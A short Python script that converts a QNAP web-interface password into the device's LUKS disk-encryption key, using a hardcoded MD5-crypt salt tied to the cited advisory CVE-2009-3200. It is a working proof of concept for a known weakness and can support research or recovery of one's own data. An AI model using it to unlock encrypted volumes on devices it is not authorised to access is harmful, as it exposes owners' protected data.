#!/usr/bin/env python
#
# Rough script (or module) to decrypt (actually convert) QNAP passwords.
# Ref. http://www.baseline-security.de/downloads/BSC-Qnap_Crypto_Backdoor-CVE-2009-3200.txt
#
# NOTE: It does NOT work on OS X!
#
##########################################################################################


from crypt import crypt
from sys import platform


def qnap_decrypt(password):
    """
    Module to decrypt (actually convert) QNAP passwords
    (Ref. http://www.baseline-security.de/downloads/BSC-Qnap_Crypto_Backdoor-CVE-2009-3200.txt).
    """
    
    if platform == 'darwin':
        raise OSError(78, 'Darwin/OS X will not return proper value! Please consider using Linux!')
    
    algorithms = {'SHA-512': '$6$', 'SHA-256': '$5$', 'MD5': '$1$', 'DES': ''}
    salt = 'YCCaQNAP'

    key = crypt(password, algorithms['MD5'] + salt)

    return key



if __name__ == '__main__':
    password = raw_input('Enter QNAP GUI password: ')
    key = qnap_decrypt(password)
    print 'The luks key is: {0}'.format(key)
